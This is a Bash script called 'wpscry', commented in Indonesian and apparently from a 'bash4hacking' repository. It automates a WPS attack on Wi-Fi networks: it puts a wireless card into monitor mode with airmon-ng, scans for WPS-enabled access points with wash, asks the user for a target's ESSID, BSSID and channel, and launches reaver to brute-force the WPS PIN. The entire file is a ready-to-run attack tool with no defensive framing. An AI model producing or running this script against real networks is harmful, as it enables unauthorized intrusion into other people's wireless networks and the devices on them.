#!/bin/bash
#---------------------------------------------------------------------------------------------------------------------
#  __        __  ____    ____     ____   ____   __   __
#  \ \      / / |  _ \  / ___|   / ___| |  _ \  \ \ / /
#   \ \ /\ / /  | |_) | \___ \  | |     | |_) |  \ V / 
#    \ V  V /   |  __/   ___) | | |___  |  _ <    | |  
#     \_/\_/    |_|     |____/   \____| |_| \_\   |_| 
#---------------------------------------------------------------------------------------------------------------------
# [+] wpscry
#     wpscry adalah sebuah script Bash sederhana yang dirancang untuk melakukan serangan otomatis terhadap jaringan Wi-Fi yang menggunakan fitur WPS (Wi-Fi Protected Setup) dengan alat reaver.
#
# [+] Pembuat
#     - Ropay
# 
# [+] Github
#     https://github.com/bgropay/bash4hacking.git
#
# [+] Daftar alat yang diperlukan:
#     - airmon-ng
#     - iwconfig
#     - wash
#     - reaver
#
# [+]  Cara menjalankannya:
#      1. chmod +x wpscry.sh
#      2. ./wpscry.sh
#---------------------------------------------------------------------------------------------------------------------

# fungsi untuk mengecek root
function cek_root(){
	if [[ "$EUID" -ne 0 ]]; then
		echo "[-] Script ini harus dijalankan sebagi root."
		exit
	fi
}

# fungsi untuk mengatur interface yang ingin digunakan
function mengatur_interface(){
	while true; do
		read -p "Interface: " interface
		if [[ ! -z "${interface}" ]]; then
			if ip link show | grep -q -w "${interface}"; then
				echo "[+] Interface ${interface} ditemukan."
				break
			else
				echo "[-] Interface ${interface} tidak ditemukan."
				continue
			fi
		else
			echo "[-] Interface tidak boleh kosong."
			continue
		fi
	done
}

# fungsi untuk mengaktifkan mode monitor pada interface yang sudah diatur
function mengaktifkan_mode_monitor(){
		if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
			echo "[+] Interface ${interface} sudah dalam mode monitor."
		else
			echo "[-] Interface ${interface} belum dalam mode monitor."
			echo "[*] Mengaktifkan mode monitor pada interface ${interface}..."
			airmon-ng check kill
			airmon-ng start "${interface}"
			if ip link show | grep -q -w  "${interface}mon"; then
				interface="${interface}mon"
			else
				interface="${interface}"
			fi

		fi

		if ip link show | grep -q -w "${interface}"; then
			if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
				echo "[+] Berhasil mengaktifkan mode monitor pada interface ${interface}."
			else
				echo "[-] Gagal mengaktifkan mode monitor pada interface ${interface}."
				exit 1
			fi

		fi
		
}

# fungsi untuk memindai jaringan wps menggunakan alat wash
function memindai_jaringan_wps(){
	echo "[*] Memindai jaringan WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
	echo ""
	wash -i "${interface}"
}

# fungsi untuk mengatur target yang ingin di serang
function mengatur_target(){

	# mengatur essid target
	while true; do
		read -p "ESSID: " essid
		if [[ ! -z "${essid}" ]]; then
			echo "[+] ${p}ESSID: '${essid}'"
			break
		else
			echo "[-] ESSID tidak boleh kosong."
			continue
		fi
	done

	# mengatur bssid target
	while  true; do
		read -p "BSSID: " bssid
		if [[ ! -z "${bssid}" ]]; then
			if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
				echo "[+] BSSID: '${bssid}'"
				break
			else
				echo "[-] BSSID tidak valid."
				continue
			fi
		else
			echo "[-] BSSID tidak boleh kososng."
			continue
		fi
	done

	# mengatur channel target
	while true; do
		read -p "Channel: " channel
		if [[ ! -z "${channel}" ]]; then
			if [[ "${channel}" =~ ^[0-9]+$ ]]; then
				echo "[+] Channel: '${channel}'"
				break
			else
				echo "[-] Channel tidak valid."
				continue
			fi
		else
			echo "[-] Channel tidak boleh kosong."
			continue
		fi
	done
	read -p "Tekan [Enter] untuk memulai serangan..."
}

# fungsi untuk melakukan serangan terhadap target yang sudah diatur
function menjalankan_serangan(){
	reaver -i "${interface}" -c "${channel}" -b "${bssid}"
}

# fungsi utama wpscry
function wpscry(){
	cek_root
	mengatur_interface
	mengaktifkan_mode_monitor
	memindai_jaringan_wps
	mengatur_target
	menjalankan_serangan
}

wpscry
